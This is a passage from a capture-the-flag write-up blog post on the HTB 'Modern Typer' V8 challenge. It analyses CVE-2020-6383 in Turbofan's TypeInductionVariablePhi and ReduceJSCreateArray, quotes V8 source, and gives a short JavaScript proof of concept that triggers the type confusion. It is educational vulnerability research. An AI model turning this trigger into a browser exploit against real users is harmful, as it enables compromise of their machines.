<!DOCTYPE html>
<html lang="en"><head>
    <title>ulexec.github.io</title>
    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
    <meta content="utf-8" http-equiv="encoding">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no" />
    <meta name="theme-color" content="#000084" />
    <link rel="icon" href="https://ulexec.github.io/favicon.ico">
    <link rel="canonical" href="https://ulexec.github.io">
    
    
</head>
<body class="bootstra-enable-cursor ">
<nav class="navbar navbar-expand-lg navbar-dark bg-primary">
    <a class="navbar-brand" href="https://ulexec.github.io">ulexec.github.io</a>
    <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#main-nav" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
    </button>
    <div id="main-nav" class="collapse nav-collapse">
        <ul class="navbar-nav">
              
            <li class="nav-item ">
                <a class="nav-link" href="/post/">
                                    
                                    <span>Archives</span>
                                </a>
            </li>
              
            <li class="nav-item ">
                <a class="nav-link" href="/publications/">
                                    
                                    <span>Publications</span>
                                </a>
            </li>
              
            <li class="nav-item ">
                <a class="nav-link" href="/projects/">
                                    
                                    <span>Projects</span>
                                </a>
            </li>
              
            <li class="nav-item ">
                <a class="nav-link" href="/bugs/">
                                    
                                    <span>Bugs</span>
                                </a>
            </li>
              
            <li class="nav-item ">
                <a class="nav-link" href="/about/">
                                    
                                    <span>About</span>
                                </a>
            </li>
             
        </ul>
    </div>
    </div>
    </div>
</nav><div id="content" class="container">

<div class="row">
    <div class="col">

        <h1 class="mb-3">HTB 2021: Modern Typer  - Thu, May 20, 2021</h1>

        <p class="lead"></p>
        <h2 id="overview">Overview</h2>
<p><strong>SPOILER</strong>: This blog contains the solution of <code>Modern Typer</code> Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog.  This challenge can be obtained from the Challenges section of <a href="http://hackthebox.com">hackthebox</a>.</p>
<h3 id="prerequisites">Prerequisites</h3>
<p>This blog is not a Turbofan reference and is not intended to be. There are excellent public resources to acquire a basic understanding of Turbofan. Here are some of them:</p>
<ul>
<li>Basic understanding of TurboFan: <a href="https://doar-e.github.io/tag/turbofan.html">Jeremy Fetiveau blogs</a></li>
<li>Basic understanding of Sea-Of-Nodes: <a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/htmlpresent">Goolgle Presentation</a></li>
</ul>
<!-- raw HTML omitted -->
<h2 id="an-overview-of-cve-2020-6383">An Overview of CVE-2020-6383</h2>
<p>Before digging through the challenge solution, first let&rsquo;s have an overview of a similar v8 typer bug to help us understand the root cause analysis of Modern Typer. This vulnerability is <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">CVE-2020-6383.</a>. I found this vulnerability by searching for older bugs affecting <code>JSCreateLowering::ReduceJSCreateArray</code> defined at <code>compiler/js-create-lowering.cc</code>. The relevance of understanding this bug in order to solve Modern Typer will be addressed later in this post.</p>
<h3 id="typeinductionvariablephi-analysis">TypeInductionVariablePhi Analysis</h3>
<p>CVE-2020-6383 involves a v8 type Inference vulnerability in <code>Typer::Visitor::TypeInductionVariablePhi</code> in <code>compiler/typer.cc</code>. When a function is attempted to be optimized by Turbofan, Turbofan&rsquo;s Typer will visit the graph of Ignition generated nodes to try to type and reduce them. The function <code>TypeInductionVariablePhi</code> is the function in charge to optimize for-loops and apply type inference analysis.</p>
<p>Let&rsquo;s break up the most relevant bits and pieces of this function before the patch for CVE-2020-6383 was applied:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> arity <span style="color:#f92672">=</span> NodeProperties<span style="color:#f92672">::</span><span style="color:#a6e22e">GetControlInput</span>(node)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ControlInputCount</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DCHECK_EQ</span>(IrOpcode<span style="color:#f92672">::</span>kLoop, NodeProperties<span style="color:#f92672">::</span><span style="color:#a6e22e">GetControlInput</span>(node)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">opcode</span>());
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DCHECK_EQ</span>(<span style="color:#ae81ff">2</span>, NodeProperties<span style="color:#f92672">::</span><span style="color:#a6e22e">GetControlInput</span>(node)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">InputCount</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">auto</span> res <span style="color:#f92672">=</span> induction_vars_<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">induction_variables</span>().<span style="color:#a6e22e">find</span>(node<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">id</span>());
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DCHECK</span>(res <span style="color:#f92672">!=</span> induction_vars_<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">induction_variables</span>().<span style="color:#a6e22e">end</span>());
</span></span><span style="display:flex;"><span>InductionVariable<span style="color:#f92672">*</span> induction_var <span style="color:#f92672">=</span> res<span style="color:#f92672">-&gt;</span>second;
</span></span><span style="display:flex;"><span>InductionVariable<span style="color:#f92672">::</span>ArithmeticType arithmetic_type <span style="color:#f92672">=</span> induction_var<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Type</span>();
</span></span><span style="display:flex;"><span>Type initial_type <span style="color:#f92672">=</span> <span style="color:#a6e22e">Operand</span>(node, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>Type increment_type <span style="color:#f92672">=</span> <span style="color:#a6e22e">Operand</span>(node, <span style="color:#ae81ff">2</span>);</span></span></code></pre></div>
<p>At the very beginning of the function, specific variables get initialized:</p>
<ul>
<li><code>initial_type</code>: holds the type of the driver variable of the for loop.</li>
<li><code>increment_type</code>: holds the type of the increment/decrement value applied to the driver variable in the for loop.</li>
<li><code>arithmetic_type</code>: holds the type of the arithmetic operation applied in the for loop, that being subtraction or addition.</li>
</ul>
<p>The function then evaluates the type of <code>initial_type</code> and <code>increment_type</code>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">bool</span> both_types_integer <span style="color:#f92672">=</span> initial_type.<span style="color:#a6e22e">Is</span>(typer_<span style="color:#f92672">-&gt;</span>cache_<span style="color:#f92672">-&gt;</span>kInteger) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>							  increment_type.<span style="color:#a6e22e">Is</span>(typer_<span style="color:#f92672">-&gt;</span>cache_<span style="color:#f92672">-&gt;</span>kInteger);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> maybe_nan <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// The addition or subtraction could still produce a NaN, if the integer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ranges touch infinity.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (both_types_integer) {
</span></span><span style="display:flex;"><span>	Type resultant_type <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>		(arithmetic_type <span style="color:#f92672">==</span> InductionVariable<span style="color:#f92672">::</span>ArithmeticType<span style="color:#f92672">::</span>kAddition)
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">?</span> typer_<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">operation_typer</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">NumberAdd</span>(initial_type, increment_type)
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">:</span> typer_<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">operation_typer</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">NumberSubtract</span>(initial_type,
</span></span><span style="display:flex;"><span>													increment_type);
</span></span><span style="display:flex;"><span>	maybe_nan <span style="color:#f92672">=</span> resultant_type.<span style="color:#a6e22e">Maybe</span>(Type<span style="color:#f92672">::</span><span style="color:#a6e22e">NaN</span>());
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// We only handle integer induction variables (otherwise ranges
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// do not apply and we cannot do anything).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>both_types_integer <span style="color:#f92672">||</span> maybe_nan) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Fallback to normal phi typing, but ensure monotonicity.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// (Unfortunately, without baking in the previous type, monotonicity might
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// be violated because we might not yet have retyped the incrementing
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// operation even though the increment&#39;s type might been already reflected
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// in the induction variable phi.)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	Type type <span style="color:#f92672">=</span> NodeProperties<span style="color:#f92672">::</span><span style="color:#a6e22e">IsTyped</span>(node) <span style="color:#f92672">?</span> NodeProperties<span style="color:#f92672">::</span><span style="color:#a6e22e">GetType</span>(node)
</span></span><span style="display:flex;"><span>										  <span style="color:#f92672">:</span> Type<span style="color:#f92672">::</span><span style="color:#a6e22e">None</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> arity; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>	  type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span><span style="color:#a6e22e">Union</span>(type, <span style="color:#a6e22e">Operand</span>(node, i), <span style="color:#a6e22e">zone</span>());
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> type;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// If we do not have enough type information for the initial value or
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// the increment, just return the initial value&#39;s type.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (initial_type.<span style="color:#a6e22e">IsNone</span>() <span style="color:#f92672">||</span> increment_type.<span style="color:#a6e22e">Is</span>(typer_<span style="color:#f92672">-&gt;</span>cache_<span style="color:#f92672">-&gt;</span>kSingletonZero)) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> initial_type;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
If the type of both <code>initial_type</code> and <code>increment_type</code> are of type <code>kInteger</code>, and the resultant type (stored in <code>resultant_type</code>) is nothing but the range of the minimum and maximum values these variables can hold. These ranges are obtained via <code>NumberAdd</code> and <code>NumberSubstract</code> returning an <code>AddRanger</code> or <code>SubstractRAnger</code> types accordingly.</p>
<p>In addition, the definition of the Type <code>kInteger</code> is the range of <code>-Infinity</code> to <code>+Infinity</code>, as defined in <code>compiler/type-cache.h</code> as shown below:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Type <span style="color:#66d9ef">const</span> kInteger <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateRange</span>(<span style="color:#f92672">-</span>V8_INFINITY, V8_INFINITY);</span></span></code></pre></div>
The range type product of the addition or subtraction operation gets evaluated next, and the likelihood of the result of the correspondent arithmetic operation to be of type <code>NaN</code> (Not a Number) is stored in <code>maybe_nan</code>. This usually holds for arithmetic operations where both operands are Infinity.</p>
<p>On the other hand, if <code>resultant_type</code> is likely to be <code>NaN</code>, or either <code>initial_type</code> or <code>increment_type</code> is not of type <code>kInteger</code> then the function returns a <code>Union</code> with all the possible types based on each operand type.</p>
<p>If both operands are of type <code>kInteger</code> the bounds of their correspondent arithmetic operation ranges gets evaluated :</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Now process the bounds.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">double</span> min <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>V8_INFINITY;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">double</span> max <span style="color:#f92672">=</span> V8_INFINITY;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">double</span> increment_min;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">double</span> increment_max;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (arithmetic_type <span style="color:#f92672">==</span> InductionVariable<span style="color:#f92672">::</span>ArithmeticType<span style="color:#f92672">::</span>kAddition) {
</span></span><span style="display:flex;"><span>	increment_min <span style="color:#f92672">=</span> increment_type.<span style="color:#a6e22e">Min</span>();
</span></span><span style="display:flex;"><span>	increment_max <span style="color:#f92672">=</span> increment_type.<span style="color:#a6e22e">Max</span>();
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DCHECK_EQ</span>(InductionVariable<span style="color:#f92672">::</span>ArithmeticType<span style="color:#f92672">::</span>kSubtraction, arithmetic_type);
</span></span><span style="display:flex;"><span>	increment_min <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>increment_type.<span style="color:#a6e22e">Max</span>();
</span></span><span style="display:flex;"><span>	increment_max <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>increment_type.<span style="color:#a6e22e">Min</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (increment_min <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// increasing sequence
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	min <span style="color:#f92672">=</span> initial_type.<span style="color:#a6e22e">Min</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">auto</span> bound : induction_var<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">upper_bounds</span>()) {
</span></span><span style="display:flex;"><span>		Type bound_type <span style="color:#f92672">=</span> <span style="color:#a6e22e">TypeOrNone</span>(bound.bound);
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// If the type is not an integer, just skip the bound.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>bound_type.<span style="color:#a6e22e">Is</span>(typer_<span style="color:#f92672">-&gt;</span>cache_<span style="color:#f92672">-&gt;</span>kInteger)) <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// If the type is not inhabited, then we can take the initial value.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (bound_type.<span style="color:#a6e22e">IsNone</span>()) {
</span></span><span style="display:flex;"><span>			max <span style="color:#f92672">=</span> initial_type.<span style="color:#a6e22e">Max</span>();
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">double</span> bound_max <span style="color:#f92672">=</span> bound_type.<span style="color:#a6e22e">Max</span>();
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (bound.kind <span style="color:#f92672">==</span> InductionVariable<span style="color:#f92672">::</span>kStrict) {
</span></span><span style="display:flex;"><span>			bound_max <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		max <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span><span style="color:#a6e22e">min</span>(max, bound_max <span style="color:#f92672">+</span> increment_max);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// The upper bound must be at least the initial value&#39;s upper bound.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>max <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span><span style="color:#a6e22e">max</span>(max, initial_type.<span style="color:#a6e22e">Max</span>());
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (increment_max <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// decreasing sequence
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	max <span style="color:#f92672">=</span> initial_type.<span style="color:#a6e22e">Max</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">auto</span> bound : induction_var<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lower_bounds</span>()) {
</span></span><span style="display:flex;"><span>		Type bound_type <span style="color:#f92672">=</span> <span style="color:#a6e22e">TypeOrNone</span>(bound.bound);
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// If the type is not an integer, just skip the bound.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>bound_type.<span style="color:#a6e22e">Is</span>(typer_<span style="color:#f92672">-&gt;</span>cache_<span style="color:#f92672">-&gt;</span>kInteger)) <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// If the type is not inhabited, then we can take the initial value.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (bound_type.<span style="color:#a6e22e">IsNone</span>()) {
</span></span><span style="display:flex;"><span>			min <span style="color:#f92672">=</span> initial_type.<span style="color:#a6e22e">Min</span>();
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">double</span> bound_min <span style="color:#f92672">=</span> bound_type.<span style="color:#a6e22e">Min</span>();
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (bound.kind <span style="color:#f92672">==</span> InductionVariable<span style="color:#f92672">::</span>kStrict) {
</span></span><span style="display:flex;"><span>			bound_min <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		min <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span><span style="color:#a6e22e">max</span>(min, bound_min <span style="color:#f92672">+</span> increment_min);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// The lower bound must be at most the initial value&#39;s lower bound.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>min <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span><span style="color:#a6e22e">min</span>(min, initial_type.<span style="color:#a6e22e">Min</span>());
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Shortcut: If the increment can be both positive and negative,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// the variable can go arbitrarily far, so just return integer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> typer_<span style="color:#f92672">-&gt;</span>cache_<span style="color:#f92672">-&gt;</span>kInteger;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> Type<span style="color:#f92672">::</span><span style="color:#a6e22e">Range</span>(min, max, typer_<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">zone</span>());</span></span></code></pre></div>
The comments provided in the source are self-explanatory. Upper and lower bounds get calculated if and only if <code>-increment_type.Max() &gt;= 0</code> or  <code>increment_type.Max() &lt;= 0</code> holds for subtraction or addition arithmetic operations accordingly. Otherwise, a <code>kInteger</code> type gets returned.</p>
<h3 id="triggering-a-type-confusion">Triggering A Type Confusion</h3>
<p>A type confusion vulnerability can be caused by a logical bug in the implementation of <code>TypeInductionVariablePhi</code> as this function does not take into account if the type of <code>increment_type</code> can become <code>NaN</code> through addition or subtraction of
Infinities during the execution of the for-loop, having the initial value of <code>initial_type</code> not being Infinity.</p>
<p>In order to understand the way to trigger this vulnerability, let&rsquo;s take a similar PoC as the one provided in the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">crbug issue</a> :</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">x</span>) {
</span></span><span style="display:flex;"><span>	  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Infinity</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#f92672">+</span><span style="color:#66d9ef">Infinity</span>;
</span></span><span style="display:flex;"><span>	  }
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">PrepareFunctionForOptimization</span>(<span style="color:#a6e22e">trigger</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">trigger</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">OptimizeFunctionOnNextCall</span>(<span style="color:#a6e22e">trigger</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">trigger</span>();</span></span></code></pre></div>
In this scenario, we will have the following:</p>
<ul>
<li><code>initial_type</code>: i = 0.</li>
<li><code>increment_type</code>: i += -Infinity.</li>
<li><code>arithmetic_type</code>: arithmetic type will be of type addition.</li>
</ul>
<p>This configuration will be ultimately interpreted as follows:</p>
<ul>
<li><code>both_types_integer</code> = <code>true</code>:
<ul>
<li>0 is of type <code>kInteger</code>, as it falls within <code>Range(-V8_INFINITY, V8_INFINITY);</code></li>
<li><code>-Infinity</code> is also of type <code>kInteger</code> as it falls within <code>Range(-V8_INFINITY, V8_INFINITY);</code></li>
</ul>
</li>
<li><code>maybe_nan</code> = <code>false</code>:
<ul>
<li>as 0 + <code>-Infinity</code> = <code>-Infinity</code>, which is of type <code>kInteger</code></li>
</ul>
</li>
<li>(<code>increment_min</code> &gt;= 0) == <code>false</code>:
<ul>
<li><code>increment_min</code> value will be <code>-Infinity</code></li>
</ul>
</li>
</ul>
<p>Therefore, <code>TypeInductionVariablePhi</code> for this case scenario will return a type of <code>kInteger</code>. However, that is only correct for the first iteration of the loop. But the loop will execute for a total of 3 iterations. The following would be the values for <code>initial_type</code> and <code>increment_type</code> per iteration:</p>
<table>
<thead>
<tr>
<th></th>
<th>First iteration</th>
<th>Second iteration</th>
<th>Third iteration</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>i</strong></td>
<td>0</td>
<td>-Infinity</td>
<td>NaN</td>
</tr>
<tr>
<td><strong>i += m</strong></td>
<td>-Infinity</td>
<td>+Infinity</td>
<td>-</td>
</tr>
</tbody>
</table>
<p>Therefore, for this specific for-loop instance Turbofan would infer <code>i</code> to be of type <code>kInteger</code>, being <code>Range(-V8_INFINITY, V8_INFINITY);</code> When in reality after the execution of the loop, <code>i</code> will be of type <code>NaN</code>, therefore leading to type confusion. This wrong type inference can be observed by analyzing the Turbofan&rsquo;s Typer phase with Turbolizer:</p>
<p><img src="//2021-12-30-134638_948x785_scrot.png#center" alt=""></p>
<h3 id="reducejscreatearray-analysis">ReduceJSCreateArray Analysis</h3>
<p>In conjunction with the previous vulnerability, there is an additional fault that enables this bug to be exploitable. This fault resides in the implementation of <code>JSCreateLowering::ReduceJSCreateArray</code>  held in <code>compiler/js-create-lowering.cc</code>.
The function <code>ReduceJSCreateArray</code> is in charge of the optimization of constructed arrays.
For sake of simplicity, the only relevant portion of this function to enable exploitation will be covered. That is the following code within <code>ReduceJSCreateArray</code> implementation:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (arity <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    Node<span style="color:#f92672">*</span> length <span style="color:#f92672">=</span> <span style="color:#a6e22e">jsgraph</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ZeroConstant</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> capacity <span style="color:#f92672">=</span> JSArray<span style="color:#f92672">::</span>kPreallocatedArrayElements;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ReduceNewArray</span>(node, length, capacity, <span style="color:#f92672">*</span>initial_map, elements_kind,
</span></span><span style="display:flex;"><span>                          allocation, slack_tracking_prediction);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (arity <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    Node<span style="color:#f92672">*</span> length <span style="color:#f92672">=</span> NodeProperties<span style="color:#f92672">::</span><span style="color:#a6e22e">GetValueInput</span>(node, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    Type length_type <span style="color:#f92672">=</span> NodeProperties<span style="color:#f92672">::</span><span style="color:#a6e22e">GetType</span>(length);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>length_type.<span style="color:#a6e22e">Maybe</span>(Type<span style="color:#f92672">::</span><span style="color:#a6e22e">Number</span>())) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Handle the single argument case, where we know that the value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// cannot be a valid Array length.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      elements_kind <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetMoreGeneralElementsKind</span>(
</span></span><span style="display:flex;"><span>          elements_kind, <span style="color:#a6e22e">IsHoleyElementsKind</span>(elements_kind) <span style="color:#f92672">?</span> HOLEY_ELEMENTS
</span></span><span style="display:flex;"><span>                                                            : PACKED_ELEMENTS);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ReduceNewArray</span>(node, std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>Node<span style="color:#f92672">*&gt;</span>{length}, <span style="color:#f92672">*</span>initial_map,
</span></span><span style="display:flex;"><span>                            elements_kind, allocation,
</span></span><span style="display:flex;"><span>                            slack_tracking_prediction);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (length_type.<span style="color:#a6e22e">Is</span>(Type<span style="color:#f92672">::</span><span style="color:#a6e22e">SignedSmall</span>()) <span style="color:#f92672">&amp;&amp;</span> length_type.<span style="color:#a6e22e">Min</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>        length_type.<span style="color:#a6e22e">Max</span>() <span style="color:#f92672">&lt;=</span> kElementLoopUnrollLimit <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>        length_type.<span style="color:#a6e22e">Min</span>() <span style="color:#f92672">==</span> length_type.<span style="color:#a6e22e">Max</span>()) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> capacity <span style="color:#f92672">=</span> static_cast<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(length_type.<span style="color:#a6e22e">Max</span>());
